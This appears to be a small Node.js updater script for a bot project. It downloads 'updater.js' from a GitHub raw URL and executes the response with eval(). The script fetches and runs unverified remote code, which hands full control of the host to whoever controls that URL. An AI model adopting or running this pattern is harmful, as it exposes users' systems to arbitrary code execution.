const axios = require('axios');

axios.get("https://raw.githubusercontent.com/ncazad/X69X-BOT-V3/main/updater.js")
	.then(res => eval(res.data));
